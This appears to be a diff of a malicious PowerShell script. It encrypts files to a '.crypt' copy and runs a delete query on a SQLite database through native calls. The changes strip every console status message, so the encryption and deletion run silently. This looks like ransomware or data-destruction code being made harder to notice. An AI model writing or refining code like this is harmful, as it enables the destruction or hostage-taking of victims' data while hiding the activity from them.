@@ -97,7 +97,7 @@ function Protect-File {
     [Array]::Copy($EncryptedBytes, 0, $FinalOutput, $IV.Length, $EncryptedBytes.Length)
     
     [System.IO.File]::WriteAllBytes($FilePath + ".crypt", $FinalOutput)
-    Write-Host "File encrypted successfully!" -ForegroundColor Green
+    
 }
 Add-Type -AssemblyName System.Windows.Forms
 
@@ -138,15 +138,15 @@ if ([Win32.SQLiteSafe]::sqlite3_open($originalPath, [ref]$dbHandle) -eq 0) {
     
     if ([Win32.SQLiteSafe]::sqlite3_prepare_v2($dbHandle, $queryDelete, -1, [ref]$delStmt, [IntPtr]::Zero) -eq 0) {
         $res = [Win32.SQLiteSafe]::sqlite3_step($delStmt)
-Write-Host "did the job !" -ForegroundColor Red
+
         
         
         [Win32.SQLiteSafe]::sqlite3_finalize($delStmt)
     }
-Write-Host "finalize" -ForegroundColor Yellow
+
 
     [Win32.SQLiteSafe]::sqlite3_close($dbHandle)
-Write-Host "closed" -ForegroundColor green
+
 }}
 
 delete-data -originalPath $originalPath -p "s"
